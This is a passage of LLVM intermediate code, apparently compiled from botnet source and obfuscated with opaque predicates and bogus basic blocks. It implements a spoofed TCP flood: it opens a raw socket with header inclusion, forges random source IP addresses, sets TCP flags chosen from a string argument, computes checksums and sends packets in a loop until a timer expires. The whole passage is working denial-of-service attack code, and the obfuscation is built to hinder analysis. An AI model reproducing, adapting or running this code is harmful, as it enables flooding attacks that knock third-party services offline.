; <label>:100:                                    ; preds = %originalBBpart24
  store i32 1, i32* %18, align 4
  %101 = load i32, i32* %17, align 4
  %102 = bitcast i32* %18 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #5
  %104 = icmp slt i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %100
  br label %575

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* %14, align 4
  %108 = icmp eq i32 %107, 0
  br i1 %108, label %109, label %126

; <label>:109:                                    ; preds = %106
  %110 = load i32, i32* @x.79
  %111 = load i32, i32* @y.80
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  store i32 0, i32* %19, align 4
  %118 = load i32, i32* @x.79
  %119 = load i32, i32* @y.80
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %132

; <label>:126:                                    ; preds = %106
  %127 = load i32, i32* %14, align 4
  %128 = sub nsw i32 32, %127
  %129 = shl i32 1, %128
  %130 = sub nsw i32 %129, 1
  %131 = xor i32 %130, -1
  store i32 %131, i32* %19, align 4
  br label %132

; <label>:132:                                    ; preds = %126, %originalBBpart212
  %133 = load i32, i32* @x.79
  %134 = load i32, i32* @y.80
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i32, i32* %12, align 4
  %142 = sext i32 %141 to i64
  %143 = add i64 40, %142
  %144 = call i8* @llvm.stacksave()
  store i8* %144, i8** %20, align 8
  %145 = alloca i8, i64 %143, align 16
  %146 = bitcast i8* %145 to %struct.iphdr*
  store %struct.iphdr* %146, %struct.iphdr** %21, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = getelementptr i8, i8* %148, i64 20
  %150 = bitcast i8* %149 to %struct.tcphdr*
  store %struct.tcphdr* %150, %struct.tcphdr** %22, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = load i32, i32* %19, align 4
  %156 = call i32 @getRandomIP(i32 %155)
  %157 = call i32 @htonl(i32 %156) #10
  %158 = load i32, i32* %12, align 4
  %159 = sext i32 %158 to i64
  %160 = add i64 20, %159
  %161 = trunc i64 %160 to i32
  call void @makeIPPacket(%struct.iphdr* %151, i32 %154, i32 %157, i8 zeroext 6, i32 %161)
  %162 = call i32 @rand_cmwc()
  %163 = trunc i32 %162 to i16
  %164 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %165 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %164, i32 0, i32 0
  %166 = bitcast %union.anon* %165 to %struct.anon.0*
  %167 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %166, i32 0, i32 0
  store i16 %163, i16* %167, align 4
  %168 = call i32 @rand_cmwc()
  %169 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %170 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %169, i32 0, i32 0
  %171 = bitcast %union.anon* %170 to %struct.anon.0*
  %172 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %171, i32 0, i32 2
  store i32 %168, i32* %172, align 4
  %173 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %174 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %173, i32 0, i32 0
  %175 = bitcast %union.anon* %174 to %struct.anon.0*
  %176 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %175, i32 0, i32 3
  store i32 0, i32* %176, align 4
  %177 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %178 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %177, i32 0, i32 0
  %179 = bitcast %union.anon* %178 to %struct.anon.0*
  %180 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %179, i32 0, i32 4
  %181 = load i16, i16* %180, align 4
  %182 = and i16 %181, -241
  %183 = or i16 %182, 80
  store i16 %183, i16* %180, align 4
  %184 = load i8*, i8** %11, align 8
  %185 = call i32 @strcmp(i8* %184, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.501, i32 0, i32 0)) #9
  %186 = icmp ne i32 %185, 0
  %187 = load i32, i32* @x.79
  %188 = load i32, i32* @y.80
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart239, label %originalBB14alteredBB

originalBBpart239:                                ; preds = %originalBB14
  br i1 %186, label %231, label %195

; <label>:195:                                    ; preds = %originalBBpart239
  %196 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 0
  %198 = bitcast %union.anon* %197 to %struct.anon.0*
  %199 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %198, i32 0, i32 4
  %200 = load i16, i16* %199, align 4
  %201 = and i16 %200, -513
  %202 = or i16 %201, 512
  store i16 %202, i16* %199, align 4
  %203 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %204 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %203, i32 0, i32 0
  %205 = bitcast %union.anon* %204 to %struct.anon.0*
  %206 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %205, i32 0, i32 4
  %207 = load i16, i16* %206, align 4
  %208 = and i16 %207, -1025
  %209 = or i16 %208, 1024
  store i16 %209, i16* %206, align 4
  %210 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %211 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %210, i32 0, i32 0
  %212 = bitcast %union.anon* %211 to %struct.anon.0*
  %213 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %212, i32 0, i32 4
  %214 = load i16, i16* %213, align 4
  %215 = and i16 %214, -257
  %216 = or i16 %215, 256
  store i16 %216, i16* %213, align 4
  %217 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon* %218 to %struct.anon.0*
  %220 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %219, i32 0, i32 4
  %221 = load i16, i16* %220, align 4
  %222 = and i16 %221, -4097
  %223 = or i16 %222, 4096
  store i16 %223, i16* %220, align 4
  %224 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 0
  %226 = bitcast %union.anon* %225 to %struct.anon.0*
  %227 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %228, -2049
  %230 = or i16 %229, 2048
  store i16 %230, i16* %227, align 4
  br label %385

; <label>:231:                                    ; preds = %originalBBpart239
  %232 = load i8*, i8** %11, align 8
  %233 = call i8* @strtok(i8* %232, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.502, i32 0, i32 0)) #5
  store i8* %233, i8** %23, align 8
  br label %234

; <label>:234:                                    ; preds = %382, %231
  %235 = load i32, i32* @x.79
  %236 = load i32, i32* @y.80
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %234
  %243 = load i8*, i8** %23, align 8
  %244 = icmp ne i8* %243, null
  %245 = load i32, i32* @x.79
  %246 = load i32, i32* @y.80
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %244, label %253, label %384

; <label>:253:                                    ; preds = %originalBBpart243
  %254 = load i32, i32* @x.79
  %255 = load i32, i32* @y.80
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %253
  %262 = load i8*, i8** %23, align 8
  %263 = call i32 @strcmp(i8* %262, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.503, i32 0, i32 0)) #9
  %264 = icmp ne i32 %263, 0
  %265 = load i32, i32* @x.79
  %266 = load i32, i32* @y.80
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br i1 %264, label %281, label %273

; <label>:273:                                    ; preds = %originalBBpart247
  %274 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %275 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %274, i32 0, i32 0
  %276 = bitcast %union.anon* %275 to %struct.anon.0*
  %277 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %276, i32 0, i32 4
  %278 = load i16, i16* %277, align 4
  %279 = and i16 %278, -513
  %280 = or i16 %279, 512
  store i16 %280, i16* %277, align 4
  br label %382

; <label>:281:                                    ; preds = %originalBBpart247
  %282 = load i8*, i8** %23, align 8
  %283 = call i32 @strcmp(i8* %282, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.504, i32 0, i32 0)) #9
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %293, label %285

; <label>:285:                                    ; preds = %281
  %286 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 0
  %288 = bitcast %union.anon* %287 to %struct.anon.0*
  %289 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %288, i32 0, i32 4
  %290 = load i16, i16* %289, align 4
  %291 = and i16 %290, -1025
  %292 = or i16 %291, 1024
  store i16 %292, i16* %289, align 4
  br label %381

; <label>:293:                                    ; preds = %281
  %294 = load i8*, i8** %23, align 8
  %295 = call i32 @strcmp(i8* %294, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.505, i32 0, i32 0)) #9
  %296 = icmp ne i32 %295, 0
  br i1 %296, label %305, label %297

; <label>:297:                                    ; preds = %293
  %298 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = and i16 %302, -257
  %304 = or i16 %303, 256
  store i16 %304, i16* %301, align 4
  br label %380

; <label>:305:                                    ; preds = %293
  %306 = load i8*, i8** %23, align 8
  %307 = call i32 @strcmp(i8* %306, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.506, i32 0, i32 0)) #9
  %308 = icmp ne i32 %307, 0
  br i1 %308, label %333, label %309

; <label>:309:                                    ; preds = %305
  %310 = load i32, i32* @x.79
  %311 = load i32, i32* @y.80
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %309
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon* %319 to %struct.anon.0*
  %321 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -4097
  %324 = or i16 %323, 4096
  store i16 %324, i16* %321, align 4
  %325 = load i32, i32* @x.79
  %326 = load i32, i32* @y.80
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart266, label %originalBB49alteredBB

originalBBpart266:                                ; preds = %originalBB49
  br label %363

; <label>:333:                                    ; preds = %305
  %334 = load i8*, i8** %23, align 8
  %335 = call i32 @strcmp(i8* %334, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.507, i32 0, i32 0)) #9
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %361, label %337

; <label>:337:                                    ; preds = %333
  %338 = load i32, i32* @x.79
  %339 = load i32, i32* @y.80
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %337
  %346 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon* %347 to %struct.anon.0*
  %349 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = and i16 %350, -2049
  %352 = or i16 %351, 2048
  store i16 %352, i16* %349, align 4
  %353 = load i32, i32* @x.79
  %354 = load i32, i32* @y.80
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart286, label %originalBB68alteredBB

originalBBpart286:                                ; preds = %originalBB68
  br label %362

; <label>:361:                                    ; preds = %333
  br label %362

; <label>:362:                                    ; preds = %361, %originalBBpart286
  br label %363

; <label>:363:                                    ; preds = %362, %originalBBpart266
  %364 = load i32, i32* @x.79
  %365 = load i32, i32* @y.80
  %366 = sub i32 %364, 1
  %367 = mul i32 %364, %366
  %368 = urem i32 %367, 2
  %369 = icmp eq i32 %368, 0
  %370 = icmp slt i32 %365, 10
  %371 = or i1 %369, %370
  br i1 %371, label %originalBB88, label %originalBB88alteredBB

originalBB88:                                     ; preds = %originalBB88alteredBB, %363
  %372 = load i32, i32* @x.79
  %373 = load i32, i32* @y.80
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBBpart290, label %originalBB88alteredBB

originalBBpart290:                                ; preds = %originalBB88
  br label %380

; <label>:380:                                    ; preds = %originalBBpart290, %297
  br label %381

; <label>:381:                                    ; preds = %380, %285
  br label %382

; <label>:382:                                    ; preds = %381, %273
  %383 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %383, i8** %23, align 8
  br label %234

; <label>:384:                                    ; preds = %originalBBpart243
  br label %385

; <label>:385:                                    ; preds = %384, %195
  %386 = load i32, i32* @x.79
  %387 = load i32, i32* @y.80
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB92, label %originalBB92alteredBB

originalBB92:                                     ; preds = %originalBB92alteredBB, %385
  %394 = call i32 @rand_cmwc()
  %395 = trunc i32 %394 to i16
  %396 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 0
  %398 = bitcast %union.anon* %397 to %struct.anon.0*
  %399 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %398, i32 0, i32 5
  store i16 %395, i16* %399, align 2
  %400 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon* %401 to %struct.anon.0*
  %403 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %402, i32 0, i32 6
  store i16 0, i16* %403, align 4
  %404 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 0
  %406 = bitcast %union.anon* %405 to %struct.anon.0*
  %407 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %406, i32 0, i32 7
  store i16 0, i16* %407, align 2
  %408 = load i32, i32* %9, align 4
  %409 = icmp eq i32 %408, 0
  %410 = load i32, i32* @x.79
  %411 = load i32, i32* @y.80
  %412 = sub i32 %410, 1
  %413 = mul i32 %410, %412
  %414 = urem i32 %413, 2
  %415 = icmp eq i32 %414, 0
  %416 = icmp slt i32 %411, 10
  %417 = or i1 %415, %416
  br i1 %417, label %originalBBpart294, label %originalBB92alteredBB

originalBBpart294:                                ; preds = %originalBB92
  br i1 %409, label %418, label %436

; <label>:418:                                    ; preds = %originalBBpart294
  %419 = load i32, i32* @x.79
  %420 = load i32, i32* @y.80
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB96, label %originalBB96alteredBB

originalBB96:                                     ; preds = %originalBB96alteredBB, %418
  %427 = call i32 @rand_cmwc()
  %428 = load i32, i32* @x.79
  %429 = load i32, i32* @y.80
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart298, label %originalBB96alteredBB

originalBBpart298:                                ; preds = %originalBB96
  br label %441

; <label>:436:                                    ; preds = %originalBBpart294
  %437 = load i32, i32* %9, align 4
  %438 = trunc i32 %437 to i16
  %439 = call zeroext i16 @htons(i16 zeroext %438) #10
  %440 = zext i16 %439 to i32
  br label %441

; <label>:441:                                    ; preds = %436, %originalBBpart298
  %442 = phi i32 [ %427, %originalBBpart298 ], [ %440, %436 ]
  %443 = trunc i32 %442 to i16
  %444 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %445 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %444, i32 0, i32 0
  %446 = bitcast %union.anon* %445 to %struct.anon.0*
  %447 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %446, i32 0, i32 1
  store i16 %443, i16* %447, align 2
  %448 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %449 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %450 = call zeroext i16 @tcpcsum(%struct.iphdr* %448, %struct.tcphdr* %449)
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 6
  store i16 %450, i16* %454, align 4
  %455 = bitcast i8* %145 to i16*
  %456 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %457 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %456, i32 0, i32 2
  %458 = load i16, i16* %457, align 2
  %459 = zext i16 %458 to i32
  %460 = call zeroext i16 @csum(i16* %455, i32 %459)
  %461 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %462 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %461, i32 0, i32 7
  store i16 %460, i16* %462, align 2
  %463 = call i64 @time(i64* null) #5
  %464 = load i32, i32* %10, align 4
  %465 = sext i32 %464 to i64
  %466 = add nsw i64 %463, %465
  %467 = trunc i64 %466 to i32
  store i32 %467, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %468

; <label>:468:                                    ; preds = %originalBBpart2110, %537, %441
  br label %469

; <label>:469:                                    ; preds = %468
  %470 = load i32, i32* %17, align 4
  %471 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %472 = call i64 @sendto(i32 %470, i8* %145, i64 %143, i32 0, %struct.sockaddr* %471, i32 16)
  %473 = load i32, i32* %19, align 4
  %474 = call i32 @getRandomIP(i32 %473)
  %475 = call i32 @htonl(i32 %474) #10
  %476 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 8
  store i32 %475, i32* %477, align 4
  %478 = call i32 @rand_cmwc()
  %479 = trunc i32 %478 to i16
  %480 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 3
  store i16 %479, i16* %481, align 4
  %482 = call i32 @rand_cmwc()
  %483 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 0
  %485 = bitcast %union.anon* %484 to %struct.anon.0*
  %486 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %485, i32 0, i32 2
  store i32 %482, i32* %486, align 4
  %487 = call i32 @rand_cmwc()
  %488 = trunc i32 %487 to i16
  %489 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %490 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %489, i32 0, i32 0
  %491 = bitcast %union.anon* %490 to %struct.anon.0*
  %492 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %491, i32 0, i32 0
  store i16 %488, i16* %492, align 4
  %493 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i32 0, i32 0
  %495 = bitcast %union.anon* %494 to %struct.anon.0*
  %496 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %495, i32 0, i32 6
  store i16 0, i16* %496, align 4
  %497 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %498 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %499 = call zeroext i16 @tcpcsum(%struct.iphdr* %497, %struct.tcphdr* %498)
  %500 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 0
  %502 = bitcast %union.anon* %501 to %struct.anon.0*
  %503 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %502, i32 0, i32 6
  store i16 %499, i16* %503, align 4
  %504 = bitcast i8* %145 to i16*
  %505 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %506 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %505, i32 0, i32 2
  %507 = load i16, i16* %506, align 2
  %508 = zext i16 %507 to i32
  %509 = call zeroext i16 @csum(i16* %504, i32 %508)
  %510 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i32 0, i32 7
  store i16 %509, i16* %511, align 2
  %512 = load i32, i32* %25, align 4
  %513 = load i32, i32* %15, align 4
  %514 = icmp eq i32 %512, %513
  br i1 %514, label %515, label %538

; <label>:515:                                    ; preds = %469
  %516 = load i32, i32* @x.79
  %517 = load i32, i32* @y.80
  %518 = sub i32 %516, 1
  %519 = mul i32 %516, %518
  %520 = urem i32 %519, 2
  %521 = icmp eq i32 %520, 0
  %522 = icmp slt i32 %517, 10
  %523 = or i1 %521, %522
  br i1 %523, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %515
  %524 = call i64 @time(i64* null) #5
  %525 = load i32, i32* %24, align 4
  %526 = sext i32 %525 to i64
  %527 = icmp sgt i64 %524, %526
  %528 = load i32, i32* @x.79
  %529 = load i32, i32* @y.80
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %527, label %536, label %537

; <label>:536:                                    ; preds = %originalBBpart2102
  br label %557

; <label>:537:                                    ; preds = %originalBBpart2102
  store i32 0, i32* %25, align 4
  br label %468

; <label>:538:                                    ; preds = %469
  %539 = load i32, i32* @x.79
  %540 = load i32, i32* @y.80
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %538
  %547 = load i32, i32* %25, align 4
  %548 = add i32 %547, 1
  store i32 %548, i32* %25, align 4
  %549 = load i32, i32* @x.79
  %550 = load i32, i32* @y.80
  %551 = sub i32 %549, 1
  %552 = mul i32 %549, %551
  %553 = urem i32 %552, 2
  %554 = icmp eq i32 %553, 0
  %555 = icmp slt i32 %550, 10
  %556 = or i1 %554, %555
  br i1 %556, label %originalBBpart2110, label %originalBB104alteredBB

originalBBpart2110:                               ; preds = %originalBB104
  br label %468

; <label>:557:                                    ; preds = %536
  %558 = load i32, i32* @x.79
  %559 = load i32, i32* @y.80
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %557
  %566 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %566)
  %567 = load i32, i32* @x.79
  %568 = load i32, i32* @y.80
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %575

; <label>:575:                                    ; preds = %originalBBpart2114, %105, %originalBBpart28, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %44
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %576 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %577 = getelementptr inbounds [8 x i8], [8 x i8]* %576, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %577, i8 0, i64 8, i32 4, i1 false)
  %578 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %578, i32* %17, align 4
  %579 = load i32, i32* %17, align 4
  %580 = icmp ne i32 %579, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %83
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  store i32 0, i32* %19, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  %581 = load i32, i32* %12, align 4
  %582 = sext i32 %581 to i64
  %_ = shl i64 40, %582
  %_15 = shl i64 40, %582
  %_16 = sub i64 40, %582
  %gen = mul i64 %_16, %582
  %_17 = shl i64 40, %582
  %_18 = sub i64 0, 40
  %gen19 = add i64 %_18, %582
  %_20 = sub i64 40, %582
  %gen21 = mul i64 %_20, %582
  %_22 = sub i64 40, %582
  %gen23 = mul i64 %_22, %582
  %_24 = sub i64 40, %582
  %gen25 = mul i64 %_24, %582
  %_26 = sub i64 0, 40
  %gen27 = add i64 %_26, %582
  %583 = add i64 40, %582
  %584 = call i8* @llvm.stacksave()
  store i8* %584, i8** %20, align 8
  %585 = alloca i8, i64 %583, align 16
  %586 = bitcast i8* %585 to %struct.iphdr*
  store %struct.iphdr* %586, %struct.iphdr** %21, align 8
  %587 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %588 = bitcast %struct.iphdr* %587 to i8*
  %589 = getelementptr i8, i8* %588, i64 20
  %590 = bitcast i8* %589 to %struct.tcphdr*
  store %struct.tcphdr* %590, %struct.tcphdr** %22, align 8
  %591 = load %struct.iphdr*, %struct.iphdr** %21, align 8
